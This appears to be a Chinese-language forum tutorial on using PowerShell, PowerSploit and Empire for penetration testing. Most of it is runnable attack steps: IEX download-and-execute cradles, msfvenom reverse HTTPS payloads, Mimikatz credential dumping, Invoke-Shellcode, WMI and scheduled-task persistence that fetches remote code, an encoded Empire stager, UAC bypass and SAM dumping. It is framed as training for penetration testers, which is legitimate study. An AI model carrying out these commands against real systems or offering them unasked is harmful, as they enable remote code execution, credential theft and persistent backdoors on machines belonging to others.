
# [原创]渗透测试中PowerShell的基本使用

## 一、加载PowerShell脚本

### 1.PowerShell的执行限制

大多数环境中，默认不允许使用未签名的PowerShell脚本。

使用下面这条命令可以查看当前执行策略：

cmd：`powershell -command Get-ExecutionPolicy`

执行策略有四种：

`Restricted`：只能运行系统PowerShell命令。要运行自定义命令，只能使用PowerShell交互式模式

`AllSigned`：带有可信发布者签名的所有脚本都可运行。

`RemoteSigned`：仅带有可信发布者签名的已下载脚本才能运行。

`Unrestricted`：不受限制。可执行所有的脚本。

使用如下命令可以更改策略

cmd：`powershell -command Set-ExecutionPolicy Unrestricted`

**注意：在很多环境中，该值由组策略强制实施。在此类情形中，更改策略并不容易。**

### 2.在命令行上传递命令

以一个简单的WMI查询为例

cmd：`powershell -com Get-WmiObject win32_computersystem`

回显如下：

```
Domain : WORKGROUP
Manufacturer : VMware, Inc.
Model : VMware7,1
Name : DESKTOP-MFPO4MO
PrimaryOwnerName : Windows User
TotalPhysicalMemory : 4293902336
```

当使用管道时需要双引号：

如；

`powershell -com "Get-WmiObject win32_computersystem | select username"`

### 3.编码命令

PowerShell有一个简便模式，只要脚本不是过长，允许Base64编码的字符串作为脚本进行传递并运行。windows命令行命令的总长度约为8000个字符，因此8000个字符就是上限。

为了创建编码命令，必须经过几处更改。首先PowerShell的`encodedcommand`选项使用base64编码的unicode字符串，因此首先需要将文本转化为Unicode，然后编码为Base64，可使用Eric Monti开发的Ruby BlackBag的工具箱。首先在linux下安装Ruby工具箱：`gem install rbkb`

然后

`echo -n "Get-WMIObject win32_computersystem | select username" | iconv -f ASCII -t UTF-16LE | b64`

得到

`RwBlAHQALQBXAE0ASQBPAGIAagBlAGMAdAAgAHcAaQBuADMAMgBfAGMAbwBtAHAAdQB0AGUAcgBzAHkAcwB0AGUAbQAgAHwAIABzAGUAbABlAGMAdAAgAHUAcwBlAHIAbgBhAG0AZQA=`

cmd中执行

`powershell -enc RwBlAHQALQBXAE0ASQBPAGIAagBlAGMAdAAgAHcAaQBuADMAMgBfAGMAbwBtAHAAdQB0AGUAcgBzAHkAcwB0AGUAbQAgAHwAIABzAGUAbABlAGMAdAAgAHUAcwBlAHIAbgBhAG0AZQA=`

### 4.通过web启动

对于复杂的脚本，进行编码未必是最佳做法。另一个做法是将脚本放在网站上，加载脚本，然后在代码中启动。PowerShell中的函数`Invoke—Expression`和`Invoke—WebRequest`可帮助完成这项任务。

`Invoke—WebRequest`函数默认使用IE引擎，在不包含该引擎的计算机中，需采取变通的方法，确保可以获取到网页。可以使用`-UserBasicParsing`选项告诉函数不要分析结果，只返回内容。

例如：

`powershell -com IEX(iwi -UserBasicParsing <mark class="encrypted">160K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0m8Q4x3X3f1H3i4K6u0W2x3q4)9J5k6e0m8Q4x3V1k6@1k6i4y4@1i4K6u0W2M7s2x3I4i4K6t1&6i4K6j5H3</mark>`

## 二、PowerSploit的简单使用

PowerSploit是一个工具集，可帮助渗透测试人员创建立足点，并在环境中逐步升级。这些工具也包含在其他框架中。

这些工具可帮助建立shell，在进程中注入代码，以及检测和反制病毒软件等，一旦在环境中建立了访问，就可以利用这些工具逐步升级，并导出关键系统信息。

### 1.安装：

`git clone <mark class="encrypted">847K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6b7L8%4N6W2M7W2y4Z5k6h3I4D9e0h3q4X3K9h3q4Q4x3V1k6b7L8%4N6W2M7W2y4H3L8r3!0A6N6q4)9J5k6h3N6A6N6q4)9$3x3l9`.`.</mark>`

`AntivirusBypass`子目录包含的脚本有助于确定反病毒软件会将哪些二进制文件确定为恶意软件。可用此处的脚本将二进制文件分成几个部分，然后运行反病毒软件。尽量缩小范围。由此可确定需要对二进制文件中的哪些字节进行修改以绕过AV签名检测。

`CodeExecution`子目录包含可使shellcode进入内存的不同实用工具。其中一些技术包括DLL注入、对进程的shellcode注入，反射注入，使用WMI的远程主机注入。可以将shellcode注入系统。

`Exfiltration`文件夹中的工具可帮助获取系统信息。还剋复制锁定的文件，从Mimikatz获取数据等。

`Mayhem`子目录中的脚本将使用选定的消息覆盖系统的主启动记录（MBR）。

`Persistence`目录包含的工具可帮助管理员维持对系统的访问。有很多持续访问的机制，包括注册表、VMI和调度任务。这些工具可以创建持续访问，包括普通用户级以及经过权限提升的级别：这样一来，无论需要什么访问级别，都可在目标上方便的实现。

`Privesc`目录包含的工具有助于提升访问权限。

`Recon`目录用于信息收集。

### 2.使用示例

#### 使用示例1：运行Mimikatz

首先加载脚本

`powershell -com iex(iwr -UserbasicParsing <mark class="encrypted">244K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2Q4x3X3g2^5i4K6u0W2P5q4)9J5k6i4S2Q4x3V1k6H3M7#2)9J5c8V1g2^5k6X3W2D9N6s2u0S2N6r3W2G2L8W2)9J5c8V1W2F1N6X3!0C8k6g2)9J5k6p5#2A6L8h3W2C8j5i4c8\*7i4K6u0W2M7s2x3I4i4K6t1&6i4K6j5H3</mark>`

再运行

`Invoke-Mimidogz`

如遇到Mimikatz命令执行权限受限，可使用如下脚本提权：

`powershell -com iex(iwr -UserbasicParsing <mark class="encrypted">383K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2Q4x3X3g2^5i4K6u0W2P5q4)9J5k6i4S2Q4x3V1k6H3M7#2)9J5c8W2m8J5K9i4k6W2M7$3y4Q4x3V1k6s2k6i4c8Q4x3X3c8e0P5i4y4@1k6h3#2Q4x3X3g2H3M7K6q4Q4y4U0l9`.</mark>`

#### 使用示例2:创建持续访问

使用msf生成攻击载荷，

```
msf > use muilti/handler
msf exploit(handler) > set payload
......
msfvenom -p windows/x64/meterpreter/reverse_https --format c LHOST=x.x.x.x | tr -d "\n\";" | sed -e 's/\\x/,0x/g' | cut -f 2- -d ','
```

然后加载脚本：

`powershell -com iex(iwr -UserbasicParsing <mark class="encrypted">73dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2Q4x3X3g2^5i4K6u0W2P5q4)9J5k6i4S2Q4x3V1k6H3M7#2)9J5c8V1y4G2k6r3g2q4P5r3g2U0N6i4c8A6L8$3&6Q4x3V1k6u0L8Y4k6G2K9$3g2Q4x3X3c8e0K9r3g2D9L8r3y4G2k6r3g2Q4x3X3g2H3M7K6q4Q4y4U0l9`.</mark>`

执行shellcode：

`Invoke-Shellcode -Shellcode <shellcode created from msfvenom>`

为建立持续的访问，需要执行以下几个步骤（本例使用WMI）：

将以上两条命令封装在一个脚本中，名叫`bs.ps1`

```
$sb = [ScriptBlock]::Create((New-Object Net.WebClient).downloadString("<mark class="encrypted">693K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4S2Q4x3X3g2^5i4K6u0W2P5q4)9J5k6i4S2Q4x3V1k6T1M7#2)9J5k6i4m8K6x3b7`.`.</mark>"))
$elev = New-ElevatedPersistenceOption -PermanentWMI -AtStartup
$user = New-UserPersistenceOption -ScheduledTask -OnIdle
Add-Persistence -ScriptBlock $sb $elev -UserPersistenceOption $user -Verbose
```

## 三、Empire的简单使用

### 1.安装：

```
git clone <mark class="encrypted">e80K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6q4L8i4m8A6M7X3g2b7M7X3!0B7k6h3y4@1i4K6u0r3c8h3#2H3K9i4u0W2i4K6u0W2k6$3W2@1i4K6j5H3</mark>
cd Empire
setup/install.sh
```

### 2.示例

#### 使用示例1：使用Empire执行命令和控制

按装Empire后，需要创建一个侦听器和一个stager。利用stager，就可以在目标系统中执行C2。侦听器从受到攻击的系统接受通信。测试人员为特定的通信协议设置一个特定的侦听器。在本例中，将使用基于http的侦听器，以便从C2返回的连接看上去是web通信。

首先设置侦听器：

进入Empire程序后

```
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listener/http) > execute
```

此时启动侦听器，下一步创建启动文件。为此，返回到主菜单，选择一个stager，如下所示：

```
(Empire: listener/http) > back
(Empire: listener) > back
(Empire) > usestager windows/launcher_bat
(Empire: stager windows/launcher_bat) > set Listener http
(Empire: stager windows/launcher_bat) > generate
```

为stager选择`windows/launcher_bat`模块。这样可以利用PowerShell命令在目标系统上进行复制和粘贴，从而启动C2。

#### 使用示例2:使用Empire攻克系统

`/tmp/launcher.bat`有三行代码。使用第二行。

```
start /b powershell -noP -sta -w l -enc SQBmACg......
```

这将启动PowerShell载荷。一旦启动命令，就可在Empire控制台看到窗口活动信息。

选择相应的代理：

```
(Empire: agents) > interact xxxxx
```

与代理交互提权：

```
(Empire: xxxxxx) > use module privesc/bypassuac
(Empire: powershell/privesc/bypassuac) > set Listener http
(Empire: powershell/privesc/bypassuac) > execute
```

下一步通过提权后的代理交互：

```
(Empire: agents) > interact xxxxx
(Empire: xxxxxx) > usemodule privesc/getsystem*
```

执行credentials下的`mimikatz/sam`模块以获取SAM转储：

```
(Empire: powershell/privesc/getsystem) > use module powershell/credentials/mimikatz/sam
(Empire: powershell/credentials/mimikatz/sam) > execute
```

添加持续化访问：

```
(Empire: powershell/credentials/mimikatz/sam) > use module powershell/persistence/elevated/wmi
(Empire: powershell/persistence/elevated/wmi) > set Listener http
(Empire: powershell/persistence/elevated/wmi) > execute
```

